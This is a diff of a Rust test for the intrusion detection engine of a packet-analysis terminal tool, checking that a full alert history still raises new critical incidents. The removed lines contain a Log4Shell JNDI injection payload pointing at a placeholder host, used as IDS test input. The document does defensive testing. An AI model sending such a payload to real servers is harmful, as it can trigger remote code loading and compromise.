@@ -1,5 +1,8 @@
 #[path = "support/packets.rs"]
 mod packets;
+#[cfg(feature = "terminal-ui")]
+#[path = "support/critical.rs"]
+mod critical;
 
 #[cfg(feature = "terminal-ui")]
 use packrat_tui::app::App;
@@ -9,13 +12,12 @@ use packrat_tui::net::security::SecurityEngine;
 #[cfg(feature = "terminal-ui")]
 fn saturated_ids_history_does_not_suppress_new_critical_incidents() {
     let mut app = App::new_for_test();
-    let payload = b"GET /${jndi:ldap://evil/x} HTTP/1.1\r\nHost: example\r\n\r\n";
     for no in 1..=1000 {
-        app.configure_core(move |core| core.security.update(&packets::tcp(no, 1, 0x18, payload)));
+        app.configure_core(move |core| core.security.update(&critical::invalid_neighbor_discovery_hop_limit(no)));
     }
     assert_eq!(app.core.read().unwrap().security.ids_alerts.len(), 1000);
     for no in 1001..=1002 {
-        app.inject_packet(packets::tcp(no, 1, 0x18, payload));
+        app.inject_packet(critical::invalid_neighbor_discovery_hop_limit(no));
     }
     assert_eq!(app.core.read().unwrap().security.ids_alerts.len(), 1000);
     assert!(app.alert_overlay_open);
@@ -24,7 +26,7 @@ fn saturated_ids_history_does_not_suppress_new_critical_incidents() {
         .alert_center
         .items
         .iter()
-        .find(|item| item.source == "IDS" && item.title.contains("Log4Shell"))
+        .find(|item| item.source == "IDS" && item.title == "Invalid IPv6 neighbor discovery hop limit")
         .unwrap();
     assert_eq!(alert.hit_count, 2);
     assert_eq!(alert.last_packet, 1002);
